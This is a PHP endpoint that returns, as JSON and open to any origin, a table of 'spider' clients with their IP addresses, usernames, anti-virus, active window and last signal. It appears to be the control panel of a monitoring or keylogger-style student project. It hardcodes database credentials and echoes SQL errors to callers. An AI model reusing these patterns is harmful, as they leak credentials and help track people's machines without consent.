<?php

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$db = mysql_connect('mysql1.alwaysdata.com', '106149_nibbler', 'password');
mysql_select_db('epitech-hub_nibbler', $db);
$sql = 'SELECT * FROM `epitech-hub_nibbler`.`spider_client` ORDER BY id DESC';
$req = mysql_query($sql) or die('SQL Error :<br>'.$sql.'<br>'.mysql_error());
$mainTab = array();
while ($data = mysql_fetch_assoc($req)) {
	$local = "";
	$local['id'] = $data['id'];
	$local['server_ip'] = $data['server_ip'];
	$local['ip_addr'] = $data['ip_addr'];
	$local['current_username'] = $data['current_username'];
	$local['last_connection'] = date('d/m/Y', $data['last_connection']).' '.date('H:i:s', $data['last_connection']);
	$local['sessions_id'] = $data['session_id'];
	$local['plateform'] = $data['plateform'];
	$local['anti_virus'] = $data['anti_virus'];
	$local['state'] = $data['state'];
	$local['curent_window'] = $data['curent_window'];
	$local['last_signal_sent'] = $data['last_signal_sent'];
	array_push($mainTab, $local);
}
$final['list'] = $mainTab;
$final['status'] = true;
echo json_encode($final);
mysql_close($db);

?>